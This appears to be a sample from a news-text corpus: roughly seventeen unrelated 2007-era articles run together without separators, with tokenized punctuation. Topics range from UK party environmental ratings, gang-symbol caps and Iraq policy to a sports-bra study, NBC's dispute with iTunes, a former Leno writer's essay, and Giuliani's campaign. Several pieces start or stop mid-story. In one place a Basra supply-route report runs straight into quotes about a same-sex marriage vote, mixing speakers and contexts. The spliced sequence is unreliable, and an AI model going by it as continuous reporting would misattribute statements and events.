They were awarded a green , amber or red light in each area - with the top grade awarded for both ambition and commitment to green policies , amber for a mixed picture , and red to show concern for a party 's approach to the area and lack of positive commitment .
The government 's attempts to reform the tax system in line with environmental costs and to tackle climate change at home were described as " timid " , but it was awarded a green light for international action on the issue .
However , Labour got a red light for planning , because of its heavy focus on economic development and not sustainability .
While the climate change bill would make the UK the first country in the world to have a legal framework for transferring to a low - carbon economy , today 's report warned that plans for airport expansion , road building and new coal - fired power stations were undermining progress .
The Conservatives were given two red lights by the organisations , for international action on climate change and green living , and no green lights .
The assessment did say that the party , which is due to publish the findings of its quality of life policy review including green issues tomorrow , was instrumental in getting the government to introduce the climate change bill .
The authors recognised that the Conservatives had not published their commitments yet but warned that there may be serious clashes between its environmental plans and other areas of policy such as the competitiveness commission , which called for wide - ranging tax cuts .
It concluded that the party would need greater substance on environmental issues .
The Lib Dems were awarded a green light for their commitment to domestic attempts to tackle climate change , but the report acknowledged that the slim chance of them forming a government allowed them greater freedom to develop policies .
The party is currently considering a target of achieving a carbon - neutral economy by 2050 , having already adopted a policy of a minimum 60 % reduction in carbon emissions by then .
The Lib Dems also got the top rating for their green living plans and for the environmental tax category for their commitment to the " green tax switch " , to shift the burden from income to polluting behaviour .
But they got a red light for their approach to the natural environment , and the report warned that all three parties were failing to give enough attention to policies to protect UK countryside and wildlife .
The Lib Dems said they continued to set the green standard the other parties needed to meet .
The party 's environment spokesman , Chris Huhne , said : " We are three times as green as the Labour party , and streets ahead of the Tories .
" The Liberal Democrats have an ambitious and realistic objective for a zero- carbon Britain , tackling carbon emissions from every part of the economy : transport , housing , offices and factories . "
A Labour party spokesman said : " We welcome a healthy debate with the green groups and though we do not agree with their assessment in all respects we welcome their recognition of the progress we are making .
" The key difference between Labour in government and the other parties is that we are getting on and delivering while the other parties only have to make promises . "
A Tory spokesman said : " The time to judge the Conservative party 's ideas on the environment is after they have been announced , not before .
" Tomorrow the quality of life group , set up by David Cameron , will unveil incredibly ambitious and comprehensive set of proposals to tackle the challenge facing our environment . "
NEW YORK --
A lineup of team logo baseball caps denounced as
tailor - made for gang members was ordered removed from store shelves
by its manufacturer Friday after complaints from baseball
officials .
" It has been brought to our attention that some combinations of
icons and colors on a select number of our caps could be too
closely perceived to be in association with gangs , " said
Christopher H. Koch , CEO of New Era Cap .
" In response , we , along
with Major League Baseball , have pulled those caps . "
The three styles in question used colors and symbols linked to
three gangs : an all - white cap with a blue bandanna , the trademark
of the notorious Crips ; an all - white cap with a red bandanna worn
by the rival Bloods ; and a black cap with a gold team logo and an
embroidered crown , a symbol favored by the Latin Kings .
" We encouraged and now fully support the decision of cap
manufacturer New Era to pull these caps and any others that feature
offensive or concerning symbols , " read an MLB statement .
The New York Yankees had joined an anti-gang group , Peace on the
Street , in denouncing the hats .
Both MLB and the Yankees insisted they were unaware of the
symbolism in the cap designs , with the New York team noting they
were never given a chance to review the new hats until they were
already for sale .
The team was " completely unaware that caps with gang - related
logos and colors had been manufactured with the New York Yankees
logo on them , " said a Yankees statement .
" The New York Yankees
oppose any garment that may be associated with gangs or
gang - related activity . "
On Thursday , protesters demonstrated about the new caps outside
several Manhattan stores carrying the merchandise .
The stores were
selling a version of the hats bearing the familiar interlocking
" NY " logo of the Yankees .
Richard Garcia , a karate instructor who works with Peace on the
Street to provide youngsters with alternatives to gangs , said he
immediately recognized the hats ' colors from his work with former
gang members .
" My fear was that the wrong kid was going to wear the wrong hat
in the wrong neighborhood and get hurt , " he said .
New Era said it would increase its efforts to ensure it had a
better working knowledge of gang symbols , names and locations .
The
Buffalo - based company has produced hats for Major League Baseball
since the 1930s .
Secretary of State Colin L. Powell ’s Saturday trip to Geneva should be a key moment for the United States to broaden United Nations involvement in the postwar rebuilding of Iraq .
But that will occur only if President Bush gives Powell the authority and backing to reach a real compromise with the European allies and Russia on a new U.N. resolution on Iraq .
With 130,000 U.S. troops in Iraq facing up to 15 attacks a day and National Guard deployments there extended to a year , the U.S. military is spread dangerously thin .
Bush ’s call Sunday for a U.N. resolution was an acknowledgment that the U.S. cannot go it alone , and he said Wednesday he was “ open for suggestions . ”
Washington needs the U.N. involved in Iraq so it can try to get other nations involved .
The European allies -- committed elsewhere , including the Balkans and Afghanistan -- ca n’t offer many ground forces .
Finances are tight everywhere , from Japan to Germany .
Pakistan may be too internally volatile to send troops on America ’s behalf .
But a U.N. resolution would let nations such as Turkey , with a significant Muslim population , send major peacekeeping contingents .
Though the European allies indicate they will accept U.S. command over all military forces in Iraq -- a key Bush demand -- France and Germany insist that a new U.N. special envoy be empowered to draw up a timetable with the Iraqi Governing Council and U.S. authorities to restore Iraqi sovereignty .
The administration , however , wants L. Paul Bremer III , its civilian administrator , to keep the final say over political affairs in Iraq .
The administration should be flexible on this issue because the sooner Iraq is governed by Iraqis , the faster the U.S. and its forces can finish their mission and leave .
Having an independent U.N. envoy also could diminish the U.S. profile as an occupier -- a role that incites Islamic extremists .
The U.S. could protect its interests and sway events in Iraq by working behind the scenes with U.N. Secretary - General Kofi Annan .

None of this will get far , though , if top Bush officials like Defense Secretary Donald H. Rumsfeld do n’t restrain their belligerence .
Rumsfeld said Wednesday he expected few nations to provide more troops .
He spun the push for a U.N. resolution not as a major Bush policy shift but just as an effort to “ provide some countries with a feeling that [ Iraq ’s rebuilding ] was more of an international activity that they were engaged in .... ”
Sorry , Mr. Secretary , but the U.S. desperately does need help on Iraq , and there are billions of dollars of reasons why .
A replay of the State Department fight for multilaterialism versus the Pentagon ’s unilateralist reluctance to see more foreign troops deployed is a recipe for more chaos in Iraq .
It may make Bush officials grit their teeth , but the U.N. help is indispensible .
I 'd venture to guess that the ozone that these printers ( and moreover bigger photocopiers ) emit is worse for you than the minute amounts of toner they spit out .
Fact : Toner is statically charged plastic powder .
If it were coming out of the printer in any sort of volume , enough to be harmful at all , it would collect all over the printer and its surroundings in a sooty mess .
Most people do n't scrub up around their print station , so you 'd see it after a week or so .
If you 're dealing with toner , wear gloves if you can .
If you get some on you , wipe it off with a dry cloth first , then cold water .
If it gets in your clothes , same thing .
It mostly just brushes off and needs heat to do anything .
Do n't breathe it in , do n't leave empty cartridges laying around .
Most companies have recycling programs for the empties .
BEND , Ore. --
It was a sunny , 70 - degree day here in Awbrey Butte , an exclusive neighborhood of big , modern houses surrounded by native pines .
To Susan Taylor , it was a perfect time to hang her laundry out to dry .
The 55 - year - old mother and part - time nurse strung a clothesline to a tree in her backyard , pinned up some freshly washed flannel sheets -- and , with that , became a renegade .
The regulations of the subdivision in which Ms. Taylor lives effectively prohibit outdoor clotheslines .
In a move that has torn apart this otherwise tranquil community , the development 's managers have threatened legal action .
To the developer and many residents , clotheslines evoke the urban blight they sought to avoid by settling in the Oregon mountains .
" This bombards the senses , " interior designer Joan Grundeman says of her neighbor 's clothesline .
" It ca n't possibly increase property values and make people think this is a nice neighborhood . "
Ms. Taylor and her supporters argue that clotheslines are one way to fight climate change , using the sun and wind instead of electricity .
" Days like this , I can do multiple loads , and within two hours , it 's done , " said Ms. Taylor .
" It smells good , and it feels different than when it comes out of the dryer . "
Judge lifts injunction on ' DC madam ' phone records Josh Catone

A judge in the US district court in Washington , D.C. has lifted the temporary restraining order ( TRO ) preventing the so - called ' DC madam , ' Deborah Jeane Palfrey , from selling or distributing the list of phone records from her escort business .
" The List in question is the Defendant 's personal property , " wrote judge Gladys Kessler , " and contains only a log of telephone numbers .
It was neither seized by the Government when it searched the Defendant 's residence in California , nor listed in the Indictment putting the Defendant on notice as to which items of her property were subject to forfeiture . "
Kessler concluded that the government had not satisfied the requirements of the forfeiture statute that would enable them to make the " extraordinary step of freezing the property of an individual , not yet convicted of any crime , and barring her from giving away that property . "
Palfrey told the Citizens for Legitimate Government that she was " very , very grateful " to Kessler for lifting the TRO .
Earlier this week , in an interview with the Vallejo Times , Palfrey said she would make the 46 pounds of Sprint phone records available to any member of the media , including bloggers .
" A couple dozen to 100 or so " of the 10,000 names listed in the records are high profile names , said Palfrey .
With the injunction lifted , it appears Palfrey can now " distribute the records en masse to as many responsible journalists , press , media , bloggers in this country , " as she has promised .
ABC
News had a partial list of the names in May , but in the 11th hour decided not to release them , instead only airing an interview with Palfrey .
" Within 24 hours the whole thing was whitewashed , " Palfrey told the Vallejo Times .
" They had names to name and they did n't name them .
Who knows who got to them -- I think the powers that be at Disney ( ABC 's parent company ) were exerting pressure on them to kill the story and they killed it at the last minute . "

Breasts move far more than ordinary bras are designed to cope with and they also bounce more during exercise – up to 21 cm rather than the maximum 16 cm bounce measured in past studies , according to new research .
Ordinary bras can stop the bouncing but the new study by University of Portsmouth scientist Dr Joanna Scurr shows that breasts also move side - to - side and in and out and estimates are that more than 50 percent of women experience breast pain when exercising , regardless of cup size .
Dr Scurr ’s study also found that breasts move as much during slow jogging as they do at maximum sprint speed .
She said : “ This makes wearing a sports bra as important if you jog slowly as if you sprint . ”
Dr Joanna Scurr , in red , with one of the 70 women in her study .
The woman has eight sensors placed on her body – on her shoulders , collarbone , nipples and hips .
As she runs the sensors reveal her breasts move in a figure of eight pattern once the movement of the body is eliminated .
Credit : University of Portsmouth
Dr Scurr is working with major bra manufacturers in Britain and globally to design a bra which can lessen movement in all three dimensions and reduce much of the pain many women suffer when exercising .
She said : “ There really are women who want to do exercise but who do n’t have the bras to cope .
I know of a 16 year old who was selected to play basketball for the county but she was told to give it up because she could n’t find a bra that made playing possible .
Breast size and pain caused by exercise can be a real barrier to women doing exercise . ”
She stresses that pain is not linked to the size of a woman ’s breasts .
An A - cup woman could be prevented from doing sport just as much as a woman with double FF - cup size .
Breasts have very limited natural support and can hurt for three main reasons : tenderness during the menstrual cycle ; permanent breast pain , and exercise - related pain due to stretching of the breast tissue .
Dr Scurr said : “ If women wore the correct form of support , if we can get that right , the use of pain medication is reduced and women can be active and lead healthy lives .
Studies have shown that medication to reduce breast pain was only successful for 54 percent of women , but they had to put up with side effects of the medication , whereas sports bras were shown to be successful at reducing breast pain for 80 percent of women , with no side effects at all . "
Dr Scurr ’s study also disproves the belief that compression bras are better for reducing movement in small breasted women and encapsulation bras better for larger breasted women .
She found instead that encapsulation bars are better at reducing breast movement in women of all cup sizes .
She said the big question is why we know so little about the movement of breasts .
“ Sports science has always been dominated by men and for them , studying breasts is seen as slightly laughable .
For women , though , it ’s completely credible – they can see the benefits .
At conferences when I am asked what I study I say ‘ bouncing breasts ’ rather than breast biomechanics .
It makes people laugh nervously but they always want to know more .
So little has been known about this subject until recently . ”
Her findings have enormous repercussions for the bra manufacturing industry and for women who want to lead active lives and have led to invitations to work with the military , the NHS and with lingerie manufacturers .
She is hoping to use cutting edge technology in ' intelligent materials ' to help develop smart fabrics which can change to provide custom - made support for each woman which varies depending on the wearer ’s level of activity .
She said : “ It is only recently that bra design has turned to science .
There was no research .
It ’s like designing a car or kitchen equipment without first thinking ‘ what is the purpose of this ? ’
We need to think why do we need bras ?
What do we need them to do ? ”
Seventy women were recruited for the two - year study through the university ’s student and staff population , gyms and doctors ’ surgeries .
Those chosen represent the widest range of breast sizes ever studied including women with cup sizes DD , E , F , FF , G , H , HH , J and JJ .
The glamour model Jordan has a cup size of F , six sizes smaller than Dr Scurr ’s biggest breasted subject .
Each woman had to undergo a programme of tests during which a wide range of biomechanical measurements were taken .
Dr Scurr said : “ We are building up a database on breast biomechanics which we believe is the largest in the world .
This information could be used to inform bra design , for clinical support , fundamental breast health research and to broaden understanding in this important area . ”

Google upped its stalker factor this week by adding face recognition abilities to its image search .
While currently unofficial and unannounced , users can now search for images that only contain faces by appending a query string onto the end of a search URL .
For example , a general image search for " Ars Technica " produces a variety of image results , but when appending " &imgtype=face " to the end of the URL , all new results contain photos of people .
The hidden feature was discovered by Google Blogoscoped , and there is currently no way to indicate that you only want to search for faces through the image search interface .
However , both " &imgtype=face " and " &imgtype=news " trigger different search results than what is presented by default — the latter showing only images that are associated with news stories .
The technology appears to be the fruit of Google 's 2006 acquisition of Neven Vision , a company that had developed techniques for facial recognition in photos .
" Neven Vision comes to Google with deep technology and expertise around automatically extracting information from a photo .
It could be as simple as detecting whether or not a photo contains a person , or , one day , as complex as recognizing people , places , and objects , " wrote Picasa product manager Adrian Graham on the Official Google Blog last August .
Google is apparently taking that technology to heart by experimenting with facial recognition online .
Even cooler ( or creepier , as the case may be ) , one day Google 's image search may be able to find faces of specific people based on image analysis / recognition alone instead of relying on the text associated with that image to identify the person in the photo .
We can probably expect more search parameters to be added to the search in the future , too , such as different types of animals , different clothing items , and more .
Until then , we 're stuck experimenting with different search terms in hopes of discovering one that the public does n't know about yet .
NBC Universal chief Jeff Zucker has some sour grapes over Apple 's continued success with iTunes and wants to make sure the whole world knows it .
According to Zucker , Apple has " destroyed the music business " and must be stopped before it does the same to video .
He revealed that the iPod maker rebuffed NBC 's proposals to raise prices on some of its content , and downright refused to give the company a cut of Apple 's iPod sales .
All of those things combined led to a bitter NBC , which eventually decided to take its ball and go home .
Apple currently prices all TV shows consistently at $ 1.99 per episode — a price that many thought was outrageous for what you got when video made its debut on the iTunes Store , but has since proven to be wildly successful .
That was n't enough for Zucker , though ; he explained that NBC " wanted to take one show , it did n't matter which one it was , and experiment and sell it for $ 2.99 , " according to Variety 's recounting of the conversation held yesterday at Syracuse University 's Newhouse School of Public Communications .
" We made that offer for months and they said no . "
Of course Apple said no .
The company — or rather , Steve Jobs — has been known to be just as stubborn as the media companies when it comes to price negotiations , and Apple has repeatedly stuck to its guns in maintaining consistent pricing across its entire store .
The only time Apple has broken its uniform pricing structure was when it first introduced iTunes Plus .
The DRM - free tracks were not just free of copy protection , they were also encoded at a higher bit rate ( 256 kbps ) than regular iTunes tracks , and therefore advertised as a better value at $ 1.29 ( compared to 99 ¢ for DRMed tracks ) .
Apple has since dropped the price on iTunes Plus songs to 99¢ , however , making all of the music on the iTunes Store uniform once again .
Zucker 's bitterness goes deeper than higher - priced videos , though .
He revealed that NBC had also asked Apple for a cut of iPod sales — a request that no doubt sent Steve Jobs into a fit of maniacal laughter before sending a one - word reply back .
" Apple sold millions of dollars worth of hardware off the back of our content , and made a lot of money , " complained Zucker .
" They did not want to share in what they were making off the hardware or allow us to adjust pricing . "
Not coincidentally , Zucker 's comments came on the same day that NBC 's own video venture , Hulu , went live to a private beta .
Launched in a partnership between NBC and News Corp. ( which , among other things , owns Fox and MySpace ) , Hulu hopes to become a premier video broadcast and distribution medium on the web .
Not only will viewers be able to watch full episodes of a number of popular TV shows and movies online for free , they will be able to embed whole videos and share them ( or clips from them ) with friends anywhere on the web , including on blogs and social networking profiles .
NBC naturally likes this setup , since it allows the companies to maintain strict control over what the users do with the content .
The ad - supported videos are web - only ( and will remain so for the foreseeable future , in order to prevent even the slightest temptation of piracy ) , and old episodes will expire eventually once new ones are added .
Zucker clearly believes that the ad - based model will make NBC more money than iTunes ever did — he said that the iTunes structure only made the company " pennies , " while the analog ( ad - supported ) world provided dollars .
Let 's not forget that , contrary to what Zucker says today , NBC did benefit greatly from its partnership with iTunes .
In December of 2005 , Zucker was quite enthusiastic to get more of NBC 's shows onto iTunes as a result of its initial success and part of the company 's " overall digital strategy . "
Almost a year later , NBC credited Apple and iTunes for singlehandedly saving its hit show , The Office , from cancellation .
If not for iTunes sales , The Office would have already been dead and six feet under , according to president of NBC Universal Television Studios Angela Bromstead .
If Apple is guilty for piggybacking on NBC 's content , NBC is just as guilty for using iTunes to gain a foothold in the digital world and then walking away to make more ad dollars on its own .
But as we wrote yesterday about Hulu , while the new service may be met with initial success , the numerous limitations will likely hurt it in the long - term .
NBC can't keep its shows in a carefully - controlled sandbox forever , but Zucker would sure like to try .
WASHINGTON , Sept. 15 — As British troops pull out of their last base in Basra , some military commanders and civilian government officials in the area are concerned that the transition could leave them and a major supply route to Baghdad at greater risk of attack .
The route , a lifeline that carries fuel , food , ammunition and equipment for the war , crosses desert territory that is home to rival militias and criminal gangs .
In interviews , Americans stationed in the southern provinces and Pentagon planners say they are closely watching the situation there as the British pass security responsibility to local Iraqi units .
There is little talk of increasing the American troop presence along the major supply route , which links Baghdad and Kuwait and is called M.S.R. Tampa , although officials in Baghdad and Washington say other options include increased patrols by armed surveillance aircraft , attack helicopters and combat jets .
The significant attention being paid to security in southern Iraq came as the senior allied commander , Gen. David H. Petraeus , announced plans in Washington this week to reduce American troop presence by five combat brigades across the country by next summer .
He added , “ We want to find out why votes switched and see what avenues are available to challenge those votes , perhaps in court . ”
Same - sex marriage supporters said the vote reflected recent changes in the makeup of the legislature , the election of Governor Patrick and a lobbying effort by national and local gay rights groups that included contacting ministers , college presidents and others who were close to legislators .
“ This was the focus of our national community , ” said Matt Foreman , executive director of the National Gay and Lesbian Task Force .
“ To lose marriage here and to wage a fight in 2008 would have been extremely difficult and an extreme effort , and frankly a loss today would have been very demoralizing to the national movement . ”
The few polls on the issue since same - sex marriage became legal in 2004 have generally found that just over half those surveyed supported it , roughly the same as before legalization .
But about half also wanted the constitutional amendment to come before voters .
One state legislator who switched his vote was Representative Paul Kujawski , saying meetings with gay men and lesbian who are his constituents persuaded him that “ I could n’t take away the happiness those people have been able to enjoy . ”
Mr. Kujawski , who said he grew up in a conservative Catholic neighborhood and had not previously understood gay relationships , said , “ So many people said , ‘ I did n’t ask to be gay , I was born this way . ’ ”
He added , “ Our job is to help people who need help , and I feel the gay side of the issue needed more help than the other side . ”
Senator Gale Candaras also voted against the amendment today , although she had supported it as a state representative in January .
She said her vote reflected constituent views in her larger , more progressive state Senate district ; her fear of a vicious referendum campaign ; and the 6,800 anti-amendment e-mails , phone calls and faxes she received , one call every three minutes .
I know that O.J. Simpson is guilty of the crimes he ’s accused of committing in Las Vegas , just as I knew he was guilty of murdering his wife and her friend in 1994 .
I also know that Phil Spector is a murderer with freaky hair .
Robert Blake most likely killed his grifter wife .
I knew at the time that the late Richard Jewell was a bumbling oaf who was probably involved in some nefarious activity the night of the Centennial Olympic Park bombing .
And I recognize that despite the jury result to the contrary , Michael Jackson is a dangerous , chimp - loving pedophile .
I know all these things because my former boss , Jay Leno , said so in so many words in his nightly monologue .
As a writer for “ The Tonight Show ” from 1995 to 2005 , my job consisted largely of waiting for public figures to be accused of something vile , preferably illegal .
Murder was No. 1 on our hit parade .
Once a public figure was accused , we writers pounced like mountain lions on a lame goat .
The jokes did not necessarily have to be good ( puns were accepted ) but almost always assumed guilt .
Here is a sampling from Leno ’s monologues after the Spector jury first appeared hung :
“ Welcome to ‘ The Tonight Show ’ in Los Angeles -- home to the stupidest jurors in America . ”
Advertisement
“ Have you heard this ?
The Phil Spector trial is deadlocked 7 to 5 on the murder charges .
They [ jurors ] were confused by something in the case .
Yeah , I think it ’s called evidence . ”
“ What do you have to do in this town to get convicted ? ”
“ This is amazing to me .
The jurors in the Phil Spector murder trial have reached an impasse .
They can not come up with a verdict .
Now the defense is asking for a mistrial .
A mistrial ?
I think that ’s the whole problem .
I think the jury missed the whole trial ! ”
Much like a hangman , a “ Tonight Show ” writer must recognize that as a well - paid jury - pool - tainter , your charge is to not question guilt .
You ’re paid for performing a task , period .
The job description does n’t allow asking if the targets deserve the ribbing .
Not until I left the payroll did I begin to feel otherwise .

There were a few exceptions , the most notable of which involved Jewell , the former security guard who recently died .
Early on , I suspected that he had n’t planted any bomb at a concert at the park during the 1996 Olympics in Atlanta .
Officials released a recorded phone threat from the person they believed culpable , and it did n’t sound like Jewell .
In TV interviews before being linked to the bombing , in which one person was killed and more than 100 injured , Jewell came across as an earnest man enjoying the attention .
I told Leno of my concerns , but the jokes about “ Doofus Dick ” Jewell continued unabated .
It was an unprecedented nightly bashing of a non-public figure , and it was unfair and excessive .
The FBI eventually cleared Jewell and praised him as a hero for quickly evacuating people near the bomb .
I also felt awkward with the nonstop “ Wacko Jacko ” jokes , of which I had generally banged out three or four before breakfast .
Maybe Jackson was truly the depraved criminal portrayed in our monologues .
Or maybe he was just a regular guy who liked to hang with kids and the bones of the Elephant Man .
The most potentially injurious jokes I wrote were about the parents of murdered JonBenet Ramsey .
If not guilty , they still had to endure a national late - night drubbing insinuating that they had killed their own child .
Although Leno has a reputation for presuming guilt the fastest and being the most relentless with mean jokes , almost all late - night hosts assume the accused are guilty .
But does it matter ?
After all , it ’s just comedy .

According to some recent studies , many Americans between 18 and 29 get some of their information about presidential elections from late - night shows .
So is n’t it a fair assumption that the shows can also influence the hearts and minds of Americans in other matters ?
When late - night shows are considered influential enough for Arnold Schwarzenegger and Fred Thompson to announce their candidacies on them , should n’t these programs rein in material labeling people accused of crimes as guilty ?
Should n’t they at least stop calling most of them guilty after their acquittals ?
Or perhaps we should do away with the Los Angeles district attorney ’s office and in court present Leno ’s monologues , which almost always do a far superior job of convincing people of a defendant ’s guilt than prosecutors .
Commentary : The next war ?
by Arnaud De Borchgrave
Bern , Switzerland ( UPI ) Aug 29 , 2007
After a brief interruption of his New Hampshire vacation to meet President Bush in the family compound at Kennebunkport , Maine , French President Nicolas Sarkozy came away convinced his U.S. counterpart is serious about bombing Iran 's secret nuclear facilities .
That 's the reading as it filtered back to Europe 's foreign ministries :
Addressing the annual meeting of France 's ambassadors to 188 countries , Sarkozy said either Iran lives up to its international obligations and relinquishes its nuclear ambitions or it will be bombed into compliance .
Sarkozy also made clear he did not agree with the Iranian - bomb - or - bombing - of - Iran position , which reflects the pledge Bush made to his loyalists and endorsed by GOP presidential candidate Sen.
John McCain and independent Sen. Joe Lieberman .
But Sarkozy recognized unless Iran 's theocrats stop enriching uranium to weapons - grade levels under International Atomic Energy Agency inspection , we will all be " faced with an alternative that I call catastrophic . "
A ranking Swiss official , speaking privately , said , " Anyone with a modicum of experience in the Middle East knows that any bombing of Iran would touch off at the very least regional instability and what could be an unmitigated disaster for Western interests . "
Leaks about the Bush administration 's plan to brand Iran 's 125,000 - strong Revolutionary Guards a global terrorist organization are widely interpreted as a major step on the escalator to military action .
Belatedly , Saudi Arabia , the world 's largest oil producer , has signed a contract with Lockheed Martin for the training of 35,000 elite guards to be assigned to the protection of the kingdom 's widely scattered oil installations .
With 25 percent of the world 's oil reserves , Riyadh has earmarked $ 5 billion to train and field what will be a high - tech force ASAP .
Eighteen months ago the desert kingdom was jolted by an al - Qaida terrorist squad that managed to penetrate the first two layers of defenses at Abqaiq , the nerve center of the entire oil infrastructure .
Iranian President Mahmoud Ahmadinejad has now stated publicly his country holds the key to the conditions of a U.S. withdrawal from Iraq .
Prime Minister Nouri al - Maliki , much criticized by the United States for his lack of leadership and deserted by half his Cabinet , is much praised in Tehran , where he has gone twice in 11 months to confer with Iranian leaders .
Ahmadinejad also says Iran is ready to fill the power vacuum in Iraq following a U.S. withdrawal .
" The political power of the occupiers is collapsing rapidly , " he said , " and soon we will see a huge power vacuum in the region . "
The United States is not alone in trying to prove Ahmadinejad 's geopolitical weather forecast wrong .
Saudi Arabia and its Gulf Cooperation Council allies in the Gulf , Egypt and Jordan are terrified at the idea of Iraq falling under Iranian domination .
Hoping to head off a U.S. - Iran military confrontation , European countries are still pinning their hopes on major Iranian concessions at the IAEA in Vienna .
Iran is back to cooperating with the IAEA -- but only one comma or semicolon at a time .
The three EU countries acting as U.S. surrogates on nuclear matters with Iran and IAEA chief Mohamed ElBaradei detect progress where the United States sees only stalling .
Iran is still resisting short - notice inspections of sites that are not officially declared nuclear facilities and where secret nuclear work is believed to be taking place .
Tehran 's only objective at the IAEA and the U.N. Security Council is to head off further economic sanctions by its major EU trading partners -- thus , the mantra that its only interest in nuclear matters is as an alternative source of energy in a country already awash in oil taxes credulity .
Both the Bush administration and Israel are painstakingly fashioning a casus belli with Iran .
For Israel , the training and weapons support Iran furnishes Hezbollah in Lebanon ( now with more rockets of all kinds than it had before the 2006 war when it fired 4,000 into Israel ) and Hamas in Gaza ( now equipped with Katyusha rockets and a range of 10.6 miles ) , coupled with Ahmadinejad 's existential threats against the Jewish state , are sufficient evidence to justify airstrikes against Iran 's nuclear facilities .
And for the White House , there is daily evidence of Iran 's Revolutionary Guards meddling in Iraq , from improvised explosive devices made in Iran to behind - the - scenes dominance in the affairs of the oil - rich south .
( CNN ) -- Filmmaker Michael Moore , whose new documentary " Sicko " takes on America 's health care system , faced off Tuesday with CNN chief medical correspondent and practicing neurosurgeon Dr. Sanjay Gupta .
Michael Moore and CNN's Sanjay Gupta argued Tuesday about Gupta 's report on Moore 's film " Sicko "
Moore criticized a report Gupta did on CNN Monday on " Sicko . "
" He said the facts were fudged , " Moore said , referring to Gupta , on CNN's " Larry King Live . "
" That 's a lie .
None of the facts are fudged . "
Moore and Gupta shouted and argued over data Gupta used and data Moore used .
Moore said his staffers backed up the film 's facts to Gupta before the report aired and that Gupta aired it knowing his facts were wrong .
Gupta disputed that .
Watch Moore , Gupta make their points »
" We try and look for some of the best sources we can possibly find , " he said .
" Michael has a lot of different numbers .
...
You 're sort of cherry - picking data from different reports . "
Both agreed , however , on the basic premise of " Sicko " : Problems abound in America 's health - care system and need to be fixed .
" I thought it was a good movie , and I wanted to say that , " Gupta said .
" I think it strikes at the irrefutable fact -- it 's broken .
We get it . "
He praised Moore for raising awareness of the issue .
However , Gupta said he was concerned that the movie -- which notes that other developed nations such as France and Canada have universal health care -- suggests that health care in those countries is free .
While patients may not pay for services at the doctor 's office , they do pay high taxes to fund such a system , something Gupta said he was concerned that " Sicko " audiences might not realize .
Moore responded by saying Americans pay more in copays , deductibles and insurance premiums .
" We [ America ] have a system built on profit , " the moviemaker said .
He asked Gupta if the current system , which requires him to receive approval from an insurance company before performing some procedures , is cumbersome to him .
" It 's a shameful system , especially when I 'm dealing with some of my patients , " Gupta said .
But he questioned Moore 's apparent solution -- putting health care in the hands of the Bush administration , which Moore fiercely criticized in the past , particularly in his film " Fahrenheit 9/11 . "
" The government actually used to do things right , " Moore said in response .
" The problem is who we put in power . "
Moore has adamantly opposed the war in Iraq and said the government should reprioritize -- a position he took many years before skepticism of the war 's success abounded in Washington .
" I am sorry we 've taken so much time trying to correct [ Gupta 's ] facts here tonight instead of talking about the real issue " -- the ailing health care system , Moore said .

NEW YORK ( Reuters ) - Rudy Giuliani rose to national fame in the aftermath of the September 11 attacks , but experts say his moment as “ America ’s mayor ” is both the biggest asset and potential liability in his White House bid .
Republican presidential candidate former New York City Mayor Rudy Giuliani takes the stage during Fox News Channel Republican Presidential debate at the University of New Hampshire in Durham , September 5 , 2007 .

On the eve of the sixth anniversary of the World Trade Center attack , experts warned there was a fine line between Giuliani emphasizing his 9/11 leadership as mayor of New York and politicizing the al Qaeda strike that killed 2,750 people in the city .
“ This is America ’s mayor trying to become America ’s president , ” Lee Miringoff , director of the Marist Institute for Public Opinion , said of Giuliani , who is leading public opinion polls for the Republican 2008 presidential nomination .
“ When he was first running it was largely a plus ... but if he is going to have front - runner status everything is under the microscope , ” Miringoff said .
“ Some people are finding his comments about everything he did as mayor as a bit of a reach . ”
Giuliani , known for his brash style and hot temper when he was mayor , is focusing on issues of national security and strong leadership as he woos voters across the country .
Critics say that while Giuliani was a reassuring presence on September 11 , he made mistakes preparing the city for an emergency prior to the attacks .
They accuse him of ignoring advice of police and emergency management experts by putting the city ’s emergency command center in the World Trade Center complex , which had been bombed in 1993 and was a presumed target .
The command center had to be abandoned on September 11 , 2001 , after the attack and as a result , police and fire commanders could not coordinate search and rescue efforts .
The National Institute of Standards and Technology concluded in a 2005 report that emergency responder lives likely were lost at the trade center because of the lack of communication .
While Giuliani has attended the previous September 11 memorial services , several groups representing some firefighters and families of victims do not want him to speak at Tuesday ’s commemoration .
“ He ’s running for president of the United States on the back of my dead son , ” said Jim Riches , a deputy chief of the New York Fire Department whose firefighter son Jimmy , 29 , died when the Twin Towers collapsed .
“ His legacy from 9/11 should be all the sick and dying firefighters and first responders , construction workers and everybody else , because he was too busy running around giving speeches and making tens of millions of dollars , ” he said .
Thousands of rescue workers who combed through the debris of the collapsed World Trade Center have developed health problems from breathing the dust and fumes of the buildings .
Riches , who spent several weeks in a coma in 2005 after suffering respiratory failure that he says was a result of working at Ground Zero , vowed he and other 9/11 families would “ get the word out about Rudy Giuliani and how he failed us . ”
Last month Giuliani formed a “ first responders ” support group to defend his record as mayor , but he told a Republican candidate debate last week that he is not “ running on what I did on September 11 . ”
“ I ’m running on the fact that I was mayor of the largest city in the country , the third - largest government in the country , ” he said .
Tony Carbonetti , a Giuliani aide , said in a statement on Monday the former mayor would never politicize 9/11 .
Steven Cohen , a public administration professor at Columbia University in New York , said Giuliani was a good mayor , but that he also alienated a lot of people during his eight years at City Hall .
“ The few days after 9/11 were really days where he was an exemplary leader .
He helped build confidence in the city again and really helped people get back on their feet , ” Cohen said .
“ He was certainly not a consensus builder in this city and is probably exaggerating his claims of being a super mayor . ”
This woman wanted to do something special for her husband 's 30th birthday so she ordered a gigantic Optimus Prime birthday cake .
The thing is the size of a toddler ( and I 'm sure has more calories ^_^ ) .
It has brownie dirt complete with fondant grass and the body is made of cake and rice crispy treats .
Kind of puts this Optimus Prime cake to shame , does n't it ?
That one was basically a truck and this one is , well , Optimus Prime .
And huge .
Just like me , ladies .

Whether we ’re looking for someone to date or sizing up a potential rival , our eyes irresistibly lock on to good - looking people , a new study finds .
Participants , all heterosexual men and women , fixated on highly attractive people within the first half - second of seeing them .
Single folks ogled the opposite sex , of course .
But those in committed relationships more often eyed beautiful people of the same sex .
“ If we ’re interested in finding a mate , our attention gets quickly and automatically stuck on attractive members of the opposite sex , ” explained study leader Jon Maner of Florida State University .
“ If we ’re jealous and worried about our partner cheating on us , attention gets quickly and automatically stuck on attractive people of our own sex because they are our competitors . ”
Maner 's research is based on the idea that evolution has primed our brains to subconsciously latch on to signs of physical attractiveness in others , both to find a mate and to guard him or her from potential competitors .
But this evolutionary trick is not without potential romantic peril .
Even some people in committed relationships had trouble tearing their eyes away from attractive members of the opposite sex .
